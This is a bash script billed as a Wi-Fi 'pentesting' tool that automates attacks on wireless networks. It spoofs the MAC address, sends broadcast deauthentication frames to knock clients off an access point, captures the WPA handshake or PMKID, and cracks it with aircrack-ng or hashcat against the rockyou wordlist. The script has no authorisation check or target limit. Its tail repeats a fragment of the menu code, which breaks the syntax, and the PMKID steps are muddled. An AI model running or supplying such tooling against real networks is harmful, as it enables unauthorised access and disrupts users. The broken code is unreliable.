#!/bin/bash

endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
blackColour="\e[0;30m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
yellowColour="\e[1;33m\033[1m"
grayColour="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=noninteractive

trap ctrl_c INT

ctrl_c() {
    echo -e "\n${redColour}[*]${endColour}${redColour} Exiting${endColour}"
    tput cnorm
    sudo airmon-ng stop "$networkCard" > /dev/null 2>&1
    rm Captura* 2>/dev/null
    exit 0
}

dependencies() {
    tput civis
    clear
    dependencies=(aircrack-ng macchanger hostapd)

    echo -e "${redColour}[*]${endColour}${grayColour} Checking necessary programs ...${endColour}"
    sleep 2

    for program in "${dependencies[@]}"; do
        echo -ne "\n${redColour}[*]${endColour}${purpleColour} Tool${endColour} ${purpleColour} program${endColour}${purpleColour}...${endColour}"

        if command -v "$program" &>/dev/null; then
            echo -e " ${redColour}(V)${endColour}"
        else
            echo -e " ${redColour}(X)${endColour}\n"
            echo -e "${redColour}[*]${endColour}${purpleColour} Installing tool${purpleColour} program${endColour}..."
            sudo apt-get install "$program" -y > /dev/null 2>&1
            if [ $? -ne 0 ]; then
                echo -e "${redColour} Error installing${program} Please install it manually${endColour}"
                exit 1
            fi
        fi
        sleep 1
    done
}

startAttack() {
    clear
    echo -e "${blackColour}[*]${endColour}${yellowColour} Configuring network card...${endColour}\n"

    echo -e "${blackColour}[*]${endColour}${yellowColour} Killing conflicting processes...${endColour}\n"
    sudo airmon-ng check kill

    echo -e "${blackColour}[*]${endColour}${yellowColour} Starting monitor mode on $networkCard...${endColour}\n"
    sudo airmon-ng start "$networkCard"
    if [ $? -ne 0 ]; then
        echo -e "${redColour}Error: Failed to start monitor mode on $networkCard${endColour}"
        exit 1
    fi

    echo -e "${blackColour}[*]${endColour}${yellowColour} Verifying interface in monitor mode...${endColour}\n"
    iwconfig

    sudo ifconfig "$networkCard" down
    if [ $? -ne 0 ]; then
        echo -e "${redColour}Error: The interface $networkCard does not exist${endColour}"
        exit 1
    fi

    echo -e "${blackColour}[*]${endColour}${yellowColour} Changing MAC address...${endColour}\n"
    sudo macchanger -a "$networkCard"
    if [ $? -ne 0 ]; then
        echo -e "${redColour}Error: Failed to change MAC address on $networkCard${endColour}"
        exit 1
    fi

    sudo ifconfig "$networkCard" up

    new_mac=$(sudo macchanger -s "$networkCard" | grep -i actual | xargs | cut -d ' ' -f '3-100')
    echo -e "${blackColour}[*]${endColour}${yellowColour} New MAC address assigned ${endColour}${purpleColour}[${endColour}${purpleColour}${new_mac}${endColour}${purpleColour}]${endColour}"

    if [ "$attack_mode" == "Handshake" ]; then
        xterm -hold -e "sudo airodump-ng $networkCard" &
        airodump_xterm_PID=$!
        echo -ne "\n${redColour}[*]${endColour}${purpleColour} Name of the access point: ${endColour}" && read -r apName
        echo -ne "\n${redColour}[*]${endColour}${purpleColour} Channel of the access point: ${endColour}" && read -r apChannel

        sudo kill -9 "$airodump_xterm_PID"
        wait "$airodump_xterm_PID" 2>/dev/null

        xterm -hold -e "sudo airodump-ng -c $apChannel -w captura --essid $apName $networkCard" &
        airodump_filter_xterm_PID=$!

        sleep 5
        xterm -hold -e "sudo aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF $networkCard" &
        aireplay_xterm_PID=$!
        sleep 10
        sudo kill -9 "$aireplay_xterm_PID"
        wait "$aireplay_xterm_PID" 2>/dev/null

        sleep 10
        sudo kill -9 "$airodump_filter_xterm_PID"
        wait "$airodump_filter_xterm_PID" 2>/dev/null

        xterm -hold -e "sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap" &
    elif [ "$attack_mode" == "PKMID" ]; then
        clear
        echo -e "${redColour}[*]${endColour}${redColour} Starting client-less PKMID attack...${endColour}\n"
        sleep 2
        sudo hcxdumptool -i wlan0 --disable_deauthentication --disable_proberequest --disable_association --disable_reassociation
        echo -e "\n\n${redColour}[*]${endColour}${grayColour} Extracting hashes...${endColour}\n"
        sleep 2
        sudo tcpdump -i wlan0 -w myHashes.pcap
        sudo rm captura 2>/dev/null

        if [ -f myHashes.pcap ]; then
            echo -e "\n${redColour}[*]${endColour}${grayColour} Starting brute force attack process...${endColour}\n"
            sleep 2
            sudo hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes.pcap -d 1 --force
        else
            echo -e "\n${redColour}[!]${endColour}${redColour} Failed to capture the necessary packet...${endColour}\n"
            sudo rm Captura* 2>/dev/null
            sleep 2
        fi
    else
        echo -e "\n${redColour}[*]${endColour}${redColour} Invalid attack mode${endColour}\n"
    fi
}

if [ "$(id -u)" == "0" ]; then
    declare -i parameter_counter=0

    while true; do
        clear
        echo -e "${redColour}[*]${endColour}${blueColour} Hack Wifi (pentesting):${endColour}"
        echo -e "\t${redColour}1.${endColour}${purpleColour} Set attack mode${endColour}"
        echo -e "\t${redColour}2.${endColour}${purpleColour} Exit${endColour}"

        read -p $'\nChoose an option: ' option

        case $option in
            1)
                while true; do
                    clear
                    echo -e "${redColour}[*]${endColour}${blueColour} Choose an option:${endColour}"
                    echo -e "\t${redColour}1.${endColour}${purpleColour} Handshake${endColour}"
                    echo -e "\t${redColour}2.${endColour}${purpleColour} PKMID${endColour}"

                    read -p $'\nChoose an option: ' attack_option

                    case $attack_option in
                        1)
                            attack_mode="Handshake"
                            echo -e "\n${redColour}[*]${endColour}${grayColour} Detecting Wi-Fi network names...${endColour}"
                            echo -e "${redColour}[*]${endColour}${grayColour} Available Wi-Fi network names:${endColour}\n"
                            iw dev | grep Interface | awk '{print $2}'
                            echo -e "\n${redColour}[*]${endColour}${purpleColour} Enter the name of the network card:${endColour}"
                            read -r networkCard
                            ;;
                        2)
                            attack_mode="PKMID"
                            echo -e "\n${redColour}[*]${endColour}${purpleColour} Detecting Wi-Fi network names...${endColour}"
                            echo -e "${redColour}[*]${endColour}${purpleColour} Available Wi-Fi network names:${endColour}\n"
                            iw dev | grep Interface | awk '{print $2}'
                            echo -e "\n${redColour}[*]${endColour}${purpleColour} Enter the name of the network card:${endColour}"
                            read -r networkCard
                            ;;
                        *)
                            echo -e "\n${redColour}[!]${endColour}${redColour} Invalid option${endColour}\n"
                            sleep 2
                            ;;
                    esac
                    echo -e "\n${redColour}[]${endColour}${redColour} Starting the attack${endColour}\n"
                    read -p "Press [Enter] to continue..."
                    startAttack
                done
                ;;
            2)
                echo -e "\n${redColour}[]${endColour}${redColour} Exiting...${endColour}\n"
                exit 0
                ;;
            *)
                echo -e "\n${redColour}[!]${endColour}${redColour} Invalid option${endColour}\n"
                sleep 2
                ;;
        esac
    done
else
    echo -e "\n${redColour}[!]${endColour}${redColour} This script must be run as root${endColour}\n"
    exit 1
fi

sleep 2
        ;;
    esac
    echo -e "\n${redColour}[]${endColour}${redColour} Starting the attack${endColour}\n"
    read -p "Press [Enter] to continue..."
    startAttack
done
;;
2)
    echo -e "\n${redColour}[]${endColour}${redColour} Exiting...${endColour}\n"
    exit 0
    ;;
*)
    echo -e "\n${redColour}[!]${endColour}${redColour} Invalid option${endColour}\n"
    sleep 2
    ;;
esac
done
else
    echo -e "\n${redColour}[!]${endColour}${redColour} This script must be run as root${endColour}\n"
    exit 1
fi
